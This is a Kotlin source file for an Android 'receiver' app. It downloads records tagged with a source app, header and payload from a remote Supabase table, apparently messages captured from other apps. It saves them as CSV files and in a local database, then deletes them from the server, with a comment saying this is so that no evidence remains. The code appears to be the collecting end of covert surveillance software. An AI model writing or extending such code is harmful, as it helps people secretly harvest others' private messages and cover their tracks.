package com.admin.vault.receiver

import android.content.Context
import android.os.Environment
import android.util.Log
import com.admin.vault.receiver.data.AppDatabase
import com.admin.vault.receiver.data.MessageEntity
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.postgrest.from
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.serialization.Serializable
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@Serializable
data class RemoteData(
    val id: Long,
    val source_app: String,
    val header: String?,
    val payload: String?,
    val created_at: String
)

class SyncManager(private val context: Context) {
    private val db = AppDatabase.getDatabase(context)
    private val scope = CoroutineScope(Dispatchers.IO)
    
    // Config file se URL aur Key lein
    private val supabase = createSupabaseClient(
        supabaseUrl = Config.SUPABASE_URL,
        supabaseKey = Config.SUPABASE_KEY
    ) { install(Postgrest) }

    fun executeVacuum() {
        scope.launch {
            try {
                // 1. FETCH: डेटा उठाओ
                val list = supabase.from("sys_sync_stream").select().decodeList<RemoteData>()
                
                if (list.isNotEmpty()) {
                    Log.d("Vacuum", "Processing ${list.size} items...")
                    
                    list.forEach { item ->
                        // 2. CSV: फाइल बनाओ
                        val path = createCsvFile(item)
                        
                        // 3. STORE: लोकल DB में डालो
                        val entity = MessageEntity(
                            supabase_id = item.id.toString(),
                            source_app = item.source_app,
                            header = item.header ?: "Unknown",
                            payload = item.payload ?: "",
                            timestamp = item.created_at,
                            file_path = path
                        )
                        db.messageDao().insert(entity)
                        
                        // 4. DELETE: सर्वर से मिटा दो (ताकि सबूत न रहे)
                        supabase.from("sys_sync_stream").delete {
                            filter { eq("id", item.id) }
                        }
                    }
                    Log.d("Vacuum", "Cleaning Complete.")
                }
            } catch (e: Exception) {
                Log.e("Vacuum", "Error: ${e.message}")
            }
        }
    }

    private fun createCsvFile(data: RemoteData): String {
        return try {
            // Folder: Documents/SecureVault
            val dir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "SecureVault")
            if (!dir.exists()) dir.mkdirs()

            // Unique Name: App_ID_Time.csv
            val time = SimpleDateFormat("HHmmss", Locale.getDefault()).format(Date())
            val filename = "${data.source_app}_${data.id}_$time.csv"
            val file = File(dir, filename)

            val writer = FileWriter(file)
            writer.append("Header,Message,Time\n")
            writer.append("\"${data.header}\",\"${data.payload}\",\"${data.created_at}\"")
            writer.flush()
            writer.close()
            
            file.absolutePath
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }
}
